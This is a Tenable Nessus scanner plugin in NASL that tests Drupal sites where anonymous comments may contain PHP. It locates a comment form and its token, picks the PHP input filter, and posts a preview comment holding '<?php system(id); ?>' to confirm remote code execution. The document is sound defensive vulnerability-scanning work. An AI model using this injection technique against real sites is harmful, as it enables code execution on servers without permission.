#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(24265);
  script_version("$Revision: 1.6 $");

  script_name(english:"Drupal Comment Function Arbitrary Code Execution");
  script_summary(english:"Tries to execute a command via Drupal");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows execution
of arbitrary code." );
 script_set_attribute(attribute:"description", value:
"The version of Drupal installed on the remote host is configured to
support arbitrary PHP code in comments.  An attacker can leverage this
issue to preview a comment and have it interpreted as PHP code, which
will result in it being executed on the affected host with the
privileges of the web server user id." );
 script_set_attribute(attribute:"solution", value:
"Review the configuration of input filters, especially those available
to anonymous users." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );


script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("drupal_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/drupal"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # First we need a posting id.
  r = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (isnull(r)) exit(0);

  pat = string('<a href="(', dir, '/\\?q=|', dir, '/)?comment/reply/([0-9]+)');
  matches = egrep(pattern:pat, string: r);
  pid = NULL;
  if (matches) 
  {
    foreach match (split(matches)) 
    {
      match = chomp(match);
      subpats = eregmatch(pattern:pat, string:match);
      if (!isnull(subpats))
      {
        pid = subpats[2];
        break;
      }
    }
  }

  # If we have one...
  if (!isnull(pid))
  {
    # Pull up the form.
    url = string(dir, "/?q=comment/reply/", pid, "#comment_form");
    r = http_send_recv3(port:port, method: "GET", item: url);
    if (isnull(r)) exit(0);

    # Grab the form token.
    pat = 'name="edit[form_token]"[^>]* value="([^"]+)"';
    matches = egrep(pattern:pat, string: r[2]);
    token = NULL;
    if (matches) 
    {
      foreach match (split(matches)) 
      {
        match = chomp(match);
        subpats = eregmatch(pattern:pat, string:match);
        if (!isnull(subpats))
        {
          token = subpats[1];
          break;
        }
      }
    }
    if (isnull(token)) token = "e7a9fc015e16fc6d493bf1692b7c28e8";

    # Make sure the PHP input filter is allowed
    if (
      ' name="edit[format]" value="' >< r[2] &&
      "You may post PHP code." >< r[2]
    )
    {
      # Figure out which input filter allows PHP code.
      filter = NULL;
      filter_name = NULL;
      j = 0;
      while (j >= 0)
      {
        i = stridx(r[2], 'name="edit[format]"', j);
        if (i >= 0) j = stridx(r[2], "</div>", i);
        else j = -1;

        if (j > 0)
        {
          item = substr(r[2], i, j);
          if ("You may post PHP code." >< item)
          {
            pat = 'name="edit\\[format\\]" value="([0-9]+)"';
            matches = egrep(pattern:pat, string:item);
            if (matches) 
            {
              foreach match (split(matches)) 
              {
                match = chomp(match);
                subpats = eregmatch(pattern:pat, string:match);
                if (!isnull(subpats))
                {
                  filter = subpats[1];
                  break;
                }
              }
            }

            pat = '> ([^<]+)</label>';
            matches = egrep(pattern:pat, string:item);
            if (matches) 
            {
              foreach match (split(matches)) 
              {
                match = chomp(match);
                subpats = eregmatch(pattern:pat, string:match);
                if (!isnull(subpats))
                {
                  filter_name = subpats[1];
                  break;
                }
              }
            }

            j = -1;
          }
        }
      }

      if (!isnull(filter))
      {
        # Try to run a command.
        cmd = "id";
        postdata = string(
          "edit[subject]=Nessus&",
          "edit[comment]=", urlencode(str:string("<?php system(", cmd, "); ?>")), "&",
          "edit[format]=", filter, "&",
          "edit[form_token]=", token, "&",
          "edit[form_id]=comment_form&",
          "op=Preview+comment"
        );
        r = http_send_recv3(method: "POST", port:port, item: url, data: postdata, version: 11, add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
        if (isnull(r)) exit(0);

       # There's a problem if we see the code in the output.
        line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string: r[2]);
        if (line)
        {
          if ('class="content">' >< line) line = strstr(line, "uid=");
          if ("</div" >< line) line = line - "</div>";

          report = string(
            "Nessus was able to execute the command '", cmd, "' on the remote host\n",
            "using the '", filter_name, "' input filter. It produced the following\n",
            "output :\n",
            "\n",
            "  ", line
          );
          security_warning(port:port, extra: report);
          exit(0);
        }
      }
    }
  }
}
